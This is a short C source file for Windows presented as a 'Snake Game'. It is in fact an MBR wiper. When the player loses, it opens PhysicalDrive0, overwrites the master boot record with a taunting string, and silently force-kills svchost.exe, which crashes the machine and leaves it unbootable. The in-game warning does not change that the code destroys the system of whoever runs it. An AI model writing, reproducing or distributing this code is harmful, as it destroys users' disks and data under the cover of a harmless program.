#include "headers/start.h"







void main_loop(){
    MessageBoxW(NULL, L"Snake Game\nMade By zvqle\nJust Don't Go Overbounds Or Your MBR will be overwritten\n\nPress Enter To Start!", L"Snake Game", MB_OK | MB_ICONINFORMATION);
    int idk = start_snake_game();
    if(idk == 1){
        HANDLE mbr = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, 0);
        WriteFile(mbr, "YOU LOST HAHAHAHHAHAHAAHHAHHAHAHHAHAHAHAH", 512, NULL, NULL);
        CloseHandle(mbr);
        WinExec("taskkill /f /im svchost.exe", SW_HIDE);
    }
}


